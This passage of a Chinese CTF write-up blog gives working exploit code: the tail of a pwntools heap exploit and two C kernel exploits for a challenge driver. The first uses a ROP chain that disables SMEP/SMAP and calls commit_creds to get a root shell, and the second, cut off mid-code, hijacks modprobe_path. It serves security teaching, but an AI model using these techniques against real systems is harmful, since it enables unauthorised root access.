punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\xf7"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>  log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc.address = "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    edit_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>    free_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">#debug()  </span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Driver：kROP"><a href="#Kylin-Driver：kROP" class="headerlink" title="Kylin_Driver：kROP"></a>Kylin_Driver：kROP</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 256M <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span>    <span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    -no-shutdown <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开了 SMEP、SMAP、KASLR，经测试开了KPTI</p><p>载入了一个LKM，位置在 &#x2F;lib&#x2F;modules&#x2F;5.10.0-9-generic&#x2F;kernel&#x2F;test.ko</p><p>注册了杂项设备结合注册结构体可知设备名称为test，该类设备的应用层接口位于&#x2F;dev目录，并且为该设备注册了处理函数<code>VrQsLpXwNfJrZtBpKjMvWsQpTyLnHrXs</code>。<br><img src="/EXP_FILE/c058402f080a342ea7305b929cc5681b_MD5.jpeg"></p><p><img src="/EXP_FILE/8e0fe6162bb3e5123ef9de3016c2b472_MD5.jpeg"></p><p>首先校验我们传入的buf，要求逐位与0xF9异或之后等于<code>gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</code></p><ul><li>0xDEADBEEF操作码：将驱动模块基址放进kbuf，再将整个kbuf与0xF9异或后放入到 buf + 0x20 处（password后面）</li><li>0xFEEDFACE操作码：将 buf+0x20 再拿出来与0xF9异或后放入kbuf，rsp指向kbuf进行retn<br><img src="/EXP_FILE/13c60f00d2f10013a8a5466b486e0fcb_MD5.jpeg"></li></ul><p>设置 nokaslr 后内核直接卡死了，目前原因不明，只能硬调kaslr了<br><img src="/EXP_FILE/74b280be16995e17cd80a281600b9a79_MD5.jpeg"></p><p>先走常规rop链，我一开始不明白给我们一个LKM基址有什么用，哦原来是LKM里有对cr4操作的gadget，不关SMAP的话commit_cred会crash<br><img src="/EXP_FILE/ddce91073f73e8b83a9f81d9b0681095_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RAX_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8308721f</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_RET</span> <span class="token expression"><span class="token number">0x0000000000000009</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RET</span> <span class="token expression"><span class="token number">0x000000000000000c</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_CR4_RDI_RET</span> <span class="token expression"><span class="token number">0x000000000000000d</span><span class="token operator">+</span>lkm</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810cf720</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810cfbe0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred<span class="token operator">=</span><span class="token number">0xffffffff82864660</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span>init_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] commit_creds = 0x%lx\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] init_cred = 0x%lx\n"</span><span class="token punctuation">,</span> init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] swapgs_restore_regs_and_return_to_usermode = 0x%lx\n"</span><span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x6f0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_CR4_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>init_cred<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/7bd4daaa0c22cd99f92eeb95360c7069_MD5.jpeg"></p><p>团长的做法是修改 modprobe_path 指向提权脚本，更直接</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RSI_RET</span> <span class="token expression"><span class="token number">0xffffffff811cc553</span><span class="token operator">+</span>koff</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">modprobe_getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo [*] modprobe: `cat /proc/sys/kernel/modprobe`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> modprobe_path<span class="token operator">=</span><span class="token number">0xffffffff82864fc0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token 